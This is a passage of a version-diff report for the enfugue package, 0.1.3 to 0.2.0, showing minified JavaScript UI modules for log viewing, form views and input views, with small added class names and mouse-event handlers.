+import{isEmpty,waitFor,deepClone}from"../../base/helpers.mjs";import{ElementBuilder}from"../../base/builder.mjs";import{Controller}from"../base.mjs";import{FormView}from"../../view/forms/base.mjs";import{TableView}from"../../view/table.mjs";import{View}from"../../view/base.mjs";import{StringInputView,ListMultiInputView}from"../../view/forms/input.mjs";const E=new ElementBuilder;class LogLevelSelectInputView extends ListMultiInputView{static defaultOptions=["DEBUG","INFO","WARN","ERROR","CRITICAL"]}class LogGlanceView extends View{static tagName="enfugue-log-glance-view";static maximumLogs=5;constructor(t){super(t),this.start=(new Date).getTime(),this.hide()}async showMore(){isEmpty(this.onShowMore)||await this.onShowMore()}async setData(t){if(void 0!==this.node){let e=t.filter((t=>new Date(t.timestamp).getTime()>this.start));if(e.length>0){(new Date).getTime();let t=e.slice(0,this.constructor.maximumLogs).map((t=>t.content)).join("\n");this.show(),this.node.find(".logs").content(t)}}}async build(){let t=await super.build();return t.append(E.div().class("log-header").content(E.h2().content("Most Recent Logs"),E.a().href("#").content("Show More").on("click",(t=>{t.preventDefault(),t.stopPropagation(),this.showMore()}))),E.div().class("logs")),t}}class LogTableView extends TableView{static className="log-table-view";static canSort=!1;static applyDefaultSort=!1;static columns={timestamp:"Timestamp",logger:"Logger",level:"Level",content:"Content"};static columnFormatters={timestamp:t=>t.replace("T"," ").split(".")[0]}}class LogFilterFormView extends FormView{static autoSubmit=!0;static fieldSets={Filters:{level:{label:"Log Levels",class:LogLevelSelectInputView,config:{value:deepClone(LogLevelSelectInputView.defaultOptions)}},search:{label:"Search",class:StringInputView}}}}class LogsController extends Controller{static logsWindowWidth=600;static logsWindowHeight=700;static maximumDetailLogs=100;static maximumGlanceLogs=5;static logTailInterval=5e3;async getLogs(){let t={};if(!isEmpty(this.lastLog)){let e=`${this.lastLog.getFullYear()}-${(this.lastLog.getMonth()+1).toString().padStart(2,"0")}-${this.lastLog.getDate().toString().padStart(2,"0")} ${this.lastLog.getHours().toString().padStart(2,"0")}:${this.lastLog.getMinutes().toString().padStart(2,"0")}:${this.lastLog.getSeconds().toString().padStart(2,"0")}`;t.since=e}isEmpty(this.levels)||(t.level=this.levels),isEmpty(this.search)||(t.search=this.search);let e=await this.model.get("/logs",null,t);return this.lastLog=new Date,isEmpty(this.logs)?this.logs=e:this.logs=e.concat(this.logs),this.logs=this.logs.slice(0,this.constructor.maximumDetailLogs),this.logs}async getLogsTable(){return isEmpty(this.logsTable)&&(await waitFor((()=>null!==this.logs&&void 0!==this.logs)),this.logsTable=new LogTableView(this.config,this.logs)),this.logsTable}async startLogTailer(){this.timer=setInterval((async()=>{let t=await this.getLogs();isEmpty(this.logsTable)||this.logsTable.setData(t,!1),isEmpty(this.glanceView)||this.glanceView.setData(t)}),this.constructor.logTailInterval)}async showLogDetails(){isEmpty(this.logDetails)?(this.logWindow=await this.spawnWindow("Engine Logs",await this.getLogsTable(),this.constructor.logsWindowWidth,this.constructor.logsWindowHeight),this.logWindow.onClose((()=>{this.logWindow=null}))):this.logWindow.focus()}async initialize(){this.glanceView=new LogGlanceView(this.config),this.glanceView.onShowMore=()=>this.showLogDetails(),this.application.container.appendChild(await this.glanceView.render()),this.startLogTailer()}}export{LogsController};
```

### Comparing `enfugue-0.1.3/enfugue/static/js/enfugue.mjs` & `enfugue-0.2.0/enfugue/static/js/enfugue.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/graphics/colors.mjs` & `enfugue-0.2.0/enfugue/static/js/graphics/colors.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/graphics/geometry.mjs` & `enfugue-0.2.0/enfugue/static/js/graphics/geometry.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/graphics/paths.mjs` & `enfugue-0.2.0/enfugue/static/js/graphics/paths.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/graphics/spline.mjs` & `enfugue-0.2.0/enfugue/static/js/graphics/spline.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/model/index.mjs` & `enfugue-0.2.0/enfugue/static/js/model/index.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/view/base.mjs` & `enfugue-0.2.0/enfugue/static/js/view/base.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/view/forms/base.mjs` & `enfugue-0.2.0/enfugue/static/js/view/forms/base.mjs`

 * *Files 4% similar despite different names*

```diff
@@ -1 +1 @@
-import{View}from"../base.mjs";import{ElementBuilder}from"../../base/builder.mjs";import{isEmpty,kebabCase,set}from"../../base/helpers.mjs";const E=new ElementBuilder;class FormView extends View{static tagName="form";static fieldSets={};static fieldSetConditions={};static autoSubmit=!1;static noSubmit=!1;static disableOnSubmit=!0;static autoComplete="off";static submitLabel="Submit";static showCancel=!1;static cancelLabel="Cancel";static collapseFieldSets=!1;constructor(t,e){super(t),this.values=e||{},this.errors={},this.submitCallbacks=[],this.cancelCallbacks=[],this.changeCallbacks=[],this.inputViews=[],this.disabled=!1,this.canceled=!1,this.dynamicFieldSets={}}async setValues(t){await this.getNode(),this.values=Object.getOwnPropertyNames(t).reduce(((e,s)=>(-1!==this.inputViews.map((t=>t.fieldName)).indexOf(s)&&(e[s]=t[s]),e)),{}),await Promise.all(this.inputViews.map((t=>t.setValue(this.values[t.fieldName],!1)))),await this.evaluateConditions();for(let t of this.inputViews)this.values[t.fieldName]=t.getValue();return this}async getInputView(t){return void 0===this.node&&await this.getNode(),this.inputViews.filter((e=>e.fieldName===t)).shift()}async addInput(t,e,s,i,a){let o=new e(this.config,s,a);if(void 0===this.dynamicFieldSets[t]&&(this.dynamicFieldSets[t]={}),this.dynamicFieldSets[t][s]={instance:o,label:i,class:e,config:a},o.onChange((()=>this.inputChanged(s,o))),this.inputViews.push(o),void 0!==this.node){let e=this.node.find(`fieldset.field-set-${kebabCase(t)}`),l=E.label().content(i).for(s),n=E.p().class("error").for(s);null===e&&(e=E.fieldset().content(E.legend().content(t)).class(`field-set-${kebabCase(t)}`),this.node.append(e)),o.fieldSet=e,isEmpty(this.errors[s])||(n.content(this.errors[s]),l.addClass("error")),o.required&&l.addClass("required"),isEmpty(o.tooltip)?isEmpty(a.tooltip)||l.data("tooltip",a.tooltip):l.data("tooltip",o.tooltip),isEmpty(i)&&l.hide(),this.values.hasOwnProperty(s)&&o.setValue(this.values[s],!1),o.onChange((()=>this.inputChanged(s,o))),this.inputViews.push(o);let r=E.div().class("field-container").content(n,await o.getNode(),l);r.addClass(kebabCase(o.constructor.name)),e.append(r)}return o}disable(){this.disabled=!0;for(let t of this.inputViews)t.disable();if(!this.constructor.autoSubmit&&!this.constructor.noSubmit&&void 0!==this.node)for(let t of this.node.findAll("input.submit"))t.disabled(!0)}enable(){this.disabled=!1;for(let t of this.inputViews)t.checkEnable();if(!this.constructor.autoSubmit&&!this.constructor.noSubmit&&void 0!==this.node)for(let t of this.node.findAll("input.submit"))t.disabled(!1)}clearError(){this.setError("")}setError(t){if(t instanceof XMLHttpRequest)try{t=JSON.parse(t.responseText)}catch(e){t=t.toString()}"string"!=typeof t&&(void 0!==t.errors&&(t=t.errors[0]),void 0!==t.detail?t=`${t.title}: ${t.detail}`:(console.error(t),t=t.toString())),this.errorMessage=t,void 0!==this.node&&(isEmpty(t)?this.node.find("p.error").empty().hide():this.node.find("p.error").content(t).show())}onChange(t){this.changeCallbacks.push(t)}onSubmit(t){this.submitCallbacks.push(t)}onCancel(t){this.cancelCallbacks.push(t)}async cancel(){for(let t of this.cancelCallbacks)await t();this.disabled=!0,this.canceled=!0}async submit(){if(this.disabled)throw"Form is disabled.";this.addClass("loading");let t=!1,e={};for(let s of this.inputViews){let i,a;void 0!==this.node&&(i=this.node.find(`p.error[data-for='${s.node.id()}']`),a=this.node.find(`label[data-for='${s.node.id()}']`));try{let t=!0;isEmpty(this.constructor.fieldSetConditions[s.fieldSet])||(isEmpty(e[s.fieldSet])&&(e[s.fieldSet]=this.constructor.fieldSetConditions[s.fieldSet](this.values)),t=e[s.fieldSet]),this.values[s.fieldName]=s.checkGetValue(t),void 0!==this.node&&(isEmpty(i)||i.empty(),isEmpty(a)||a.removeClass("error"))}catch(e){t=!0,this.errors[s.fieldName]=e,void 0!==this.node&&(isEmpty(i)||i.content(e),isEmpty(a)||a.addClass("error"))}}if(t)return this.setError("Error"),void this.removeClass("loading");this.constructor.disableOnSubmit&&!this.constructor.autoSubmit&&this.disable(),this.submitResults=[];for(let t of this.submitCallbacks)try{this.submitResults.push(await t(this.values))}catch(t){this.setError(t),this.enable();break}this.removeClass("loading")}async evaluateConditions(){if(void 0!==this.node)for(let t in this.constructor.fieldSetConditions){let e=this.node.find(`fieldset.field-set-${kebabCase(t)}`);if(this.constructor.fieldSetConditions[t](this.values)){isEmpty(e)||e.show();for(let e of this.inputViews)e.required&&e.fieldSet==t&&(await e.getNode()).attr("required",!0)}else{isEmpty(e)||e.hide();for(let e of this.inputViews)e.required&&e.fieldSet==t&&(await e.getNode()).attr("required",!1)}}}async inputChanged(t,e){this.values[t]=e.getValue(),void 0!==this.node&&await this.evaluateConditions();for(let e of this.changeCallbacks)await e(t,this.values);this.constructor.autoSubmit&&await this.submit()}async build(){let t=await super.build(),e=this.constructor.fieldSets,s=this.dynamicFieldSets,i=set(Object.getOwnPropertyNames(e).concat(Object.getOwnPropertyNames(s)));t.attr("autocomplete",this.constructor.autoComplete);for(let a of i){let i=E.legend().content(a),o=E.fieldset().content(i).class(`field-set-${kebabCase(a)}`),l=this.constructor.fieldSetConditions[a],n=!1,r=void 0!==s[a],d=r?s[a]:e[a];isEmpty(l)||(n=!l(this.values)),n&&o.hide(),this.constructor.collapseFieldSets&&(o.addClass("collapsible collapsed"),i.on("click",(t=>{t.stopPropagation(),o.toggleClass("collapsed")})));for(let t in d){let e=E.div().class("field-container"),s=d[t].class,i=d[t].instance,l=d[t].label,c=d[t].config,h=e.elementId;if(isEmpty(s))throw`Field ${t} does not provide a class.`;isEmpty(c)&&(c={});let u,p=E.label().content(l).data("for",h),f=E.p().class("error").data("for",h);if(r?(u=i,e.addClass(kebabCase(i.constructor.name)),i.formParent=this):(e.addClass(kebabCase(s.name)),u=new s(this.config,t,c),u.onChange((()=>this.inputChanged(t,u))),this.inputViews.push(u),u.formParent=this),u.fieldSet=a,isEmpty(this.errors[t])||(f.content(this.errors[t]),p.addClass("error")),u.required&&p.addClass("required"),isEmpty(u.tooltip)||p.data("tooltip",u.tooltip),isEmpty(l)&&p.hide(),this.values.hasOwnProperty(t))u.setValue(this.values[t]);else{let e=u.getValue();e&&(this.values[t]=e)}p.on("click",(()=>u.labelClicked())),o.append(e.content(f,(await u.getNode()).id(h),p)),u.required&&n&&u.node.attr("required",!1)}t.append(o)}let a=E.p().class("error");if(isEmpty(this.errorMessage)?a.hide():a.content(this.errorMessage),t.append(a),!this.constructor.autoSubmit&&!this.constructor.noSubmit){let e=E.input().type("submit").class("submit").value(this.constructor.submitLabel),s=E.div().class("submit-buttons").content(e);if(t.append(s),this.constructor.showCancel){t.addClass("can-cancel");let e=E.input().type("button").class("submit cancel").value(this.constructor.cancelLabel);e.on("click",(()=>{e.hasClass("disabled")||this.cancel()})),s.append(e)}}return t.on("submit",(t=>{t.preventDefault(),t.stopPropagation(),this.submit()})),t}}export{FormView};
+import{View}from"../base.mjs";import{ElementBuilder}from"../../base/builder.mjs";import{isEmpty,kebabCase,set}from"../../base/helpers.mjs";const E=new ElementBuilder;class FormView extends View{static tagName="form";static fieldSets={};static fieldSetConditions={};static autoSubmit=!1;static noSubmit=!1;static disableOnSubmit=!0;static autoComplete="off";static submitLabel="Submit";static showCancel=!1;static cancelLabel="Cancel";static collapseFieldSets=!1;constructor(t,e){super(t),this.values=e||{},this.errors={},this.submitCallbacks=[],this.cancelCallbacks=[],this.changeCallbacks=[],this.inputViews=[],this.disabled=!1,this.canceled=!1,this.dynamicFieldSets={}}async setValues(t){await this.getNode(),this.values=Object.getOwnPropertyNames(t).reduce(((e,s)=>(-1!==this.inputViews.map((t=>t.fieldName)).indexOf(s)&&(e[s]=t[s]),e)),{}),await Promise.all(this.inputViews.map((t=>t.setValue(this.values[t.fieldName],!1)))),await this.evaluateConditions();for(let t of this.inputViews)this.values[t.fieldName]=t.getValue();return this}async getInputView(t){return void 0===this.node&&await this.getNode(),this.inputViews.filter((e=>e.fieldName===t)).shift()}async addInput(t,e,s,i,a){let o=new e(this.config,s,a);if(void 0===this.dynamicFieldSets[t]&&(this.dynamicFieldSets[t]={}),this.dynamicFieldSets[t][s]={instance:o,label:i,class:e,config:a},o.onChange((()=>this.inputChanged(s,o))),this.inputViews.push(o),void 0!==this.node){let e=this.node.find(`fieldset.field-set-${kebabCase(t)}`),l=E.label().content(i).for(s),n=E.p().class("error").for(s);null===e&&(e=E.fieldset().content(E.legend().content(t)).class(`field-set-${kebabCase(t)}`),this.node.append(e)),o.fieldSet=e,isEmpty(this.errors[s])||(n.content(this.errors[s]),l.addClass("error")),o.required&&l.addClass("required"),isEmpty(o.tooltip)?isEmpty(a.tooltip)||l.data("tooltip",a.tooltip):l.data("tooltip",o.tooltip),isEmpty(i)&&l.hide(),this.values.hasOwnProperty(s)&&o.setValue(this.values[s],!1),o.onChange((()=>this.inputChanged(s,o))),this.inputViews.push(o);let r=E.div().class("field-container").content(n,await o.getNode(),l);r.addClass(kebabCase(o.constructor.name)).addClass(kebabCase(o.constructor.name)+"-"+kebabCase(s)),e.append(r)}return o}disable(){this.disabled=!0;for(let t of this.inputViews)t.disable();if(!this.constructor.autoSubmit&&!this.constructor.noSubmit&&void 0!==this.node)for(let t of this.node.findAll("input.submit"))t.disabled(!0)}enable(){this.disabled=!1;for(let t of this.inputViews)t.checkEnable();if(!this.constructor.autoSubmit&&!this.constructor.noSubmit&&void 0!==this.node)for(let t of this.node.findAll("input.submit"))t.disabled(!1)}clearError(){this.setError("")}setError(t){if(t instanceof XMLHttpRequest)try{t=JSON.parse(t.responseText)}catch(e){t=t.toString()}"string"!=typeof t&&(void 0!==t.errors&&(t=t.errors[0]),void 0!==t.detail?t=`${t.title}: ${t.detail}`:(console.error(t),t=t.toString())),this.errorMessage=t,void 0!==this.node&&(isEmpty(t)?this.node.find("p.error").empty().hide():this.node.find("p.error").content(t).show())}onChange(t){this.changeCallbacks.push(t)}onSubmit(t){this.submitCallbacks.push(t)}onCancel(t){this.cancelCallbacks.push(t)}async cancel(){for(let t of this.cancelCallbacks)await t();this.disabled=!0,this.canceled=!0}async submit(){if(this.disabled)throw"Form is disabled.";this.addClass("loading");let t=!1,e={};for(let s of this.inputViews){let i,a;void 0!==this.node&&(i=this.node.find(`p.error[data-for='${s.node.id()}']`),a=this.node.find(`label[data-for='${s.node.id()}']`));try{let t=!0;isEmpty(this.constructor.fieldSetConditions[s.fieldSet])||(isEmpty(e[s.fieldSet])&&(e[s.fieldSet]=this.constructor.fieldSetConditions[s.fieldSet](this.values)),t=e[s.fieldSet]),this.values[s.fieldName]=s.checkGetValue(t),void 0!==this.node&&(isEmpty(i)||i.empty(),isEmpty(a)||a.removeClass("error"))}catch(e){t=!0,this.errors[s.fieldName]=e,void 0!==this.node&&(isEmpty(i)||i.content(e),isEmpty(a)||a.addClass("error"))}}if(t)return this.setError("Error"),void this.removeClass("loading");this.constructor.disableOnSubmit&&!this.constructor.autoSubmit&&this.disable(),this.submitResults=[];for(let t of this.submitCallbacks)try{this.submitResults.push(await t(this.values))}catch(t){this.setError(t),this.enable();break}this.removeClass("loading")}async evaluateConditions(){if(void 0!==this.node)for(let t in this.constructor.fieldSetConditions){let e=this.node.find(`fieldset.field-set-${kebabCase(t)}`);if(this.constructor.fieldSetConditions[t](this.values)){isEmpty(e)||e.show();for(let e of this.inputViews)e.required&&e.fieldSet==t&&(await e.getNode()).attr("required",!0)}else{isEmpty(e)||e.hide();for(let e of this.inputViews)e.required&&e.fieldSet==t&&(await e.getNode()).attr("required",!1)}}}async inputChanged(t,e){this.values[t]=e.getValue(),void 0!==this.node&&await this.evaluateConditions();for(let e of this.changeCallbacks)await e(t,this.values);this.constructor.autoSubmit&&await this.submit()}async build(){let t=await super.build(),e=this.constructor.fieldSets,s=this.dynamicFieldSets,i=set(Object.getOwnPropertyNames(e).concat(Object.getOwnPropertyNames(s)));t.attr("autocomplete",this.constructor.autoComplete);for(let a of i){let i=E.legend().content(a),o=E.fieldset().content(i).class(`field-set-${kebabCase(a)}`),l=this.constructor.fieldSetConditions[a],n=!1,r=void 0!==s[a],d=r?s[a]:e[a];isEmpty(l)||(n=!l(this.values)),n&&o.hide(),(!0===this.constructor.collapseFieldSets||Array.isArray(this.constructor.collapseFieldSets)&&-1!==this.constructor.collapseFieldSets.indexOf(a))&&(o.addClass("collapsible collapsed"),i.on("click",(t=>{t.stopPropagation(),o.toggleClass("collapsed")})));for(let t in d){let e=E.div().class("field-container"),s=d[t].class,i=d[t].instance,l=d[t].label,c=d[t].config,h=e.elementId;if(isEmpty(s))throw`Field ${t} does not provide a class.`;isEmpty(c)&&(c={});let u,p=E.label().content(l).data("for",h),b=E.p().class("error").data("for",h);if(r?(u=i,e.addClass(kebabCase(i.constructor.name)).addClass(kebabCase(i.constructor.name)+"-"+kebabCase(t)),i.formParent=this):(e.addClass(kebabCase(s.name)).addClass(kebabCase(s.name)+"-"+kebabCase(t)),u=new s(this.config,t,c),u.onChange((()=>this.inputChanged(t,u))),this.inputViews.push(u),u.formParent=this),u.fieldSet=a,isEmpty(this.errors[t])||(b.content(this.errors[t]),p.addClass("error")),u.required&&p.addClass("required"),isEmpty(u.tooltip)||p.data("tooltip",u.tooltip),isEmpty(l)&&p.hide(),this.values.hasOwnProperty(t))u.setValue(this.values[t]);else{let e=u.getValue();e&&(this.values[t]=e)}p.on("click",(()=>u.labelClicked())),o.append(e.content(b,(await u.getNode()).id(h),p)),u.required&&n&&u.node.attr("required",!1)}t.append(o)}let a=E.p().class("error");if(isEmpty(this.errorMessage)?a.hide():a.content(this.errorMessage),t.append(a),!this.constructor.autoSubmit&&!this.constructor.noSubmit){let e=E.input().type("submit").class("submit").value(this.constructor.submitLabel),s=E.div().class("submit-buttons").content(e);if(t.append(s),this.constructor.showCancel){t.addClass("can-cancel");let e=E.input().type("button").class("submit cancel").value(this.constructor.cancelLabel);e.on("click",(()=>{e.hasClass("disabled")||this.cancel()})),s.append(e)}}return t.on("submit",(t=>{t.preventDefault(),t.stopPropagation(),this.submit()})),t}}export{FormView};
```

### Comparing `enfugue-0.1.3/enfugue/static/js/view/forms/classic.mjs` & `enfugue-0.2.0/enfugue/static/js/view/forms/classic.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/view/forms/input/base.mjs` & `enfugue-0.2.0/enfugue/static/js/view/forms/input/base.mjs`

 * *Files 17% similar despite different names*

```diff
@@ -1 +1 @@
-import{View}from"../../base.mjs";import{isEmpty}from"../../../base/helpers.mjs";class InputView extends View{static tagName="input";static inputType="text";static defaultValue=null;static placeholder=null;static autoComplete="off";constructor(t,i,e){super(t),this.fieldName=i,isEmpty(this.fieldName)&&(this.fieldName="unnamed"),this.fieldConfig=e||{},this.value=isEmpty(this.fieldConfig.value)?this.constructor.defaultValue:this.fieldConfig.value,this.errorMessage=null,this.autoComplete=isEmpty(this.fieldConfig.autoComplete)?this.constructor.autoComplete:this.fieldConfig.autoComplete,this.editable=!(!1===this.fieldConfig.editable),this.disabled=!!this.fieldConfig.disabled,this.readonly=!!this.fieldConfig.readonly,this.required=!!this.fieldConfig.required,this.placeholder=this.fieldConfig.placeholder||this.constructor.placeholder,this.tooltip=this.fieldConfig.tooltip||this.constructor.tooltip,this.onChangeCallbacks=[],this.onInputCallbacks=[],this.onFocusCallbacks=[],this.onBlurCallbacks=[],isEmpty(this.constructor.onChange)||this.onChange((t=>this.constructor.onChange(this,t))),isEmpty(this.constructor.onInput)||this.onInput((t=>this.constructor.onInput(this,t))),isEmpty(this.constructor.onFocus)||this.onFocus((t=>this.constructor.onFocus(this,t))),isEmpty(this.constructor.onBlur)||this.onBlur((t=>this.constructor.onBlur(this,t)))}onChange(t){this.onChangeCallbacks.push(t)}onInput(t){this.onInputCallbacks.push(t)}onFocus(t){this.onFocusCallbacks.push(t)}onBlur(t){this.onBlurCallbacks.push(t)}focus(){void 0!==this.node&&this.node.focus()}changed(t){isEmpty(t)||(t.stopPropagation(),t.preventDefault());let i=this.value,e=this.getValue();for(let t of this.onChangeCallbacks)t(this.fieldName,i,e);this.value=e}inputted(t){t.stopPropagation(),t.preventDefault();let i=this.getValue();for(let t of this.onInputCallbacks)t(i)}focused(t){t.stopPropagation(),t.preventDefault();for(let i of this.onFocusCallbacks)i(t)}blurred(t){t.stopPropagation(),t.preventDefault();for(let i of this.onBlurCallbacks)i(t)}disable(){return this.disabled=!0,void 0!==this.node&&this.node.disabled(!0),this}checkEnable(){return this.editable||isEmpty(this.value)?this.enable():this}enable(){return this.disabled=!1,void 0!==this.node&&this.node.disabled(!1),this}setValue(t,i){let e=this.value!==t;return this.value=t,void 0!==this.node&&this.node.val(this.value,!1),!1!==i&&e&&this.changed(),this.editable||this.disable(),this}getValue(){return void 0!==this.node&&void 0!==this.node.element?this.node.val():this.value}checkGetValue(t){let i=this.getValue();if(this.required&&isEmpty(i)&&!1!==t)throw"This field is required.";return i}labelClicked(){this.focus()}async build(){let t=await super.build();return t.name(this.fieldName).attr("disabled",this.disabled).attr("readonly",this.readonly).attr("required",this.required).attr("autocomplete",this.autoComplete).on("change",(t=>this.changed(t))).on("input",(t=>this.inputted(t))).on("blur",(t=>this.blurred(t))).on("focus",(t=>this.focused(t))).on("click,mouseup,mousedown",(t=>t.stopPropagation())),"input"==this.constructor.tagName&&t.type(this.constructor.inputType),isEmpty(this.value)||t.val(this.value),isEmpty(this.placeholder)||t.attr("placeholder",this.placeholder),isEmpty(this.tooltip)||t.data("tooltip",this.tooltip),t}}export{InputView};
+import{View}from"../../base.mjs";import{isEmpty}from"../../../base/helpers.mjs";class InputView extends View{static tagName="input";static inputType="text";static defaultValue=null;static placeholder=null;static autoComplete="off";constructor(t,e,i){super(t),this.fieldName=e,isEmpty(this.fieldName)&&(this.fieldName="unnamed"),this.fieldConfig=i||{},this.value=isEmpty(this.fieldConfig.value)?this.constructor.defaultValue:this.fieldConfig.value,this.errorMessage=null,this.autoComplete=isEmpty(this.fieldConfig.autoComplete)?this.constructor.autoComplete:this.fieldConfig.autoComplete,this.editable=!(!1===this.fieldConfig.editable),this.disabled=!!this.fieldConfig.disabled,this.readonly=!!this.fieldConfig.readonly,this.required=!!this.fieldConfig.required,this.placeholder=this.fieldConfig.placeholder||this.constructor.placeholder,this.tooltip=this.fieldConfig.tooltip||this.constructor.tooltip,this.onChangeCallbacks=[],this.onInputCallbacks=[],this.onFocusCallbacks=[],this.onBlurCallbacks=[],this.onClickCallbacks=[],this.onMouseUpCallbacks=[],this.onMouseDownCallbacks=[]}onChange(t){this.onChangeCallbacks.push(t)}onInput(t){this.onInputCallbacks.push(t)}onFocus(t){this.onFocusCallbacks.push(t)}onBlur(t){this.onBlurCallbacks.push(t)}onClick(t){this.onClickCallbacks.push(t)}onMouseDown(t){this.onMouseDownCallbacks.push(t)}onMouseUp(t){this.onMouseUpCallbacks.push(t)}focus(){void 0!==this.node&&this.node.focus()}changed(t){isEmpty(t)||(t.stopPropagation(),t.preventDefault());let e=this.value,i=this.getValue();for(let t of this.onChangeCallbacks)t(this.fieldName,e,i);this.value=i}inputted(t){t.stopPropagation(),t.preventDefault();let e=this.getValue();for(let t of this.onInputCallbacks)t(e)}focused(t){t.stopPropagation(),t.preventDefault();for(let e of this.onFocusCallbacks)e(t)}blurred(t){t.stopPropagation(),t.preventDefault();for(let e of this.onBlurCallbacks)e(t)}clicked(t){t.stopPropagation();for(let e of this.onClickCallbacks)e(t)}mouseUpped(t){t.stopPropagation();for(let e of this.onMouseUpCallbacks)e(t)}mouseDowned(t){t.stopPropagation();for(let e of this.onMouseDownCallbacks)e(t)}disable(){return this.disabled=!0,void 0!==this.node&&this.node.disabled(!0),this}checkEnable(){return this.editable||isEmpty(this.value)?this.enable():this}enable(){return this.disabled=!1,void 0!==this.node&&this.node.disabled(!1),this}setValue(t,e){let i=this.value!==t;return this.value=t,void 0!==this.node&&this.node.val(this.value,!1),!1!==e&&i&&this.changed(),this.editable||this.disable(),this}getValue(){return void 0!==this.node&&void 0!==this.node.element?this.node.val():this.value}checkGetValue(t){let e=this.getValue();if(this.required&&isEmpty(e)&&!1!==t)throw"This field is required.";return e}labelClicked(){this.focus()}async build(){let t=await super.build();return t.name(this.fieldName).attr("disabled",this.disabled).attr("readonly",this.readonly).attr("required",this.required).attr("autocomplete",this.autoComplete).on("change",(t=>this.changed(t))).on("input",(t=>this.inputted(t))).on("blur",(t=>this.blurred(t))).on("focus",(t=>this.focused(t))).on("click",(t=>this.clicked(t))).on("mouseup",(t=>this.mouseUpped(t))).on("mousedown",(t=>this.mouseDowned(t))),"input"==this.constructor.tagName&&t.type(this.constructor.inputType),isEmpty(this.value)||t.val(this.value),isEmpty(this.placeholder)||t.attr("placeholder",this.placeholder),isEmpty(this.tooltip)||t.data("tooltip",this.tooltip),t}}export{InputView};
```

### Comparing `enfugue-0.1.3/enfugue/static/js/view/forms/input/color.mjs` & `enfugue-0.2.0/enfugue/static/js/view/forms/input/color.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/view/forms/input/enumerable.mjs` & `enfugue-0.2.0/enfugue/static/js/view/forms/input/enumerable.mjs`

 * *Files 2% similar despite different names*

```diff
@@ -1 +1 @@
-import{isEmpty,jaroWinkler,strip}from"../../../base/helpers.mjs";import{ElementBuilder}from"../../../base/builder.mjs";import{InputView}from"./base.mjs";import{StringInputView}from"./string.mjs";const E=new ElementBuilder({searchList:"enfugue-search-list",searchListItem:"enfugue-search-list-item",searchSelection:"enfugue-search-list-selection",repeatableInput:"enfugue-repeatable-input",repeatableItem:"enfugue-repeatable-input-item"});class EnumerableInputView extends InputView{static defaultOptions={};constructor(t,e,s){super(t,e,s),this.options=this.fieldConfig.options||{},this.sortFunction=this.fieldConfig.sortFunction||((t,e)=>t-e),this.filterFunction=this.fieldConfig.filterFunction||((t,e)=>!1)}setOptions(t){Array.isArray(t)?this.options=t.reduce(((t,e)=>(t[e]=e,t)),{}):this.options=t,void 0!==this.node&&this.rebuildOptions()}async sortOptions(t){this.sortFunction=t,void 0!==this.node&&await this.rebuildOptions()}async filterOptions(t){this.filterFunction=t,void 0!==this.node&&await this.rebuildOptions()}async sortFilterOptions(t,e){this.sortFunction=t,this.filterFunction=e,void 0!==this.node&&await this.rebuildOptions()}async getOptions(){let t=this.options,e=this.constructor.defaultOptions;"function"==typeof t&&(t=await this.options()),Array.isArray(t)&&(t=t.reduce(((t,e)=>(t[e]=e,t)),{})),"function"==typeof e&&(e=await e()),Array.isArray(e)&&(e=e.reduce(((t,e)=>(t[e]=e,t)),{}));let s={...e,...t},i=Object.getOwnPropertyNames(s),a={};i.sort(((t,e)=>this.sortFunction(t,e,s[t],s[e])));for(let t of i)this.filterFunction(t,s[t])||(a[t]=s[t]);return a}buildOptions(t,e){}async rebuildOptions(){void 0!==this.node&&this.buildOptions(this.node,await this.getOptions())}async build(){let t=await super.build();return this.buildOptions(t,await this.getOptions()),t}}class SelectInputView extends EnumerableInputView{static tagName="select";static alwaysShowEmpty=!1;static allowEmpty=!1;async buildOptions(t,e){let s=this.placeholder;isEmpty(s)&&(s="Select One");let i=[];(isEmpty(this.value)||this.constructor.alwaysShowEmpty||this.constructor.allowEmpty)&&i.push(E.option().selected(!0).disabled(!this.constructor.allowEmpty).value("").content(s));for(let t in e){let s=E.option().value(t).content(e[t]);this.value==t&&s.selected(!0),i.push(s)}return t.content(...i)}setValue(t,e){if(void 0!==this.node){this.node.value(t);for(let t of this.node.findAll("option"))t.value()==this.value?t.selected(!0):t.selected(!1)}super.setValue(t,e)}async build(){let t=await super.build();return isEmpty(this.value)||t.value(this.value),t}}class ListInputView extends EnumerableInputView{static tagName="ul";static className="list-input-view";static maximumOptions=1/0;getValue(){return this.value}setValue(t,e){if(super.setValue(t,e),void 0!==this.node)for(let t of this.node.findAll("li"))t.data("value")===this.value?t.addClass("selected"):t.removeClass("selected")}buildOptions(t,e){let s=0,i=[];for(let a in e){let n=E.span().content(e[a]),l=E.li().content(n).data("value",a);if(l.on("click",(e=>{e.stopPropagation(),e.preventDefault();for(let e of t.children())e.removeClass("selected");l.addClass("selected"),this.value=a,this.changed()})),this.value===a&&l.addClass("selected"),i.push(l),s++,s>=this.constructor.maximumOptions)break}return t.content(...i)}}class ListMultiInputView extends ListInputView{static maximumSelected=1/0;static className="list-input-view multi-list-input-view";constructor(t,e,s){super(t,e,s),isEmpty(this.value)&&(this.value=[])}setValue(t,e){if(super.setValue(t,e),isEmpty(this.value)?this.value=[]:Array.isArray(this.value)||(this.value=[this.value]),void 0!==this.node)for(let t of this.node.findAll("li"))-1!==this.value.indexOf(t.data("value"))?t.addClass("selected"):t.removeClass("selected")}buildOptions(t,e){let s=0,i=[];for(let t in e){let a=E.li().content(E.span().content(e[t])).data("value",t);if(a.on("click",(e=>{e.stopPropagation(),e.preventDefault(),a.hasClass("selected")?(this.value=this.value.filter((e=>e!==t)),a.removeClass("selected")):(isEmpty(this.value)&&(this.value=[]),this.value.push(t),a.addClass("selected")),this.changed()})),isEmpty(this.value)&&-1!==this.value.indexOf(t)&&a.addClass("selected"),i.push(a),s++,s>=this.constructor.maximumOptions)break}return t.content(...i)}}class SearchListInputListView extends ListInputView{static maximumOptions=100;static 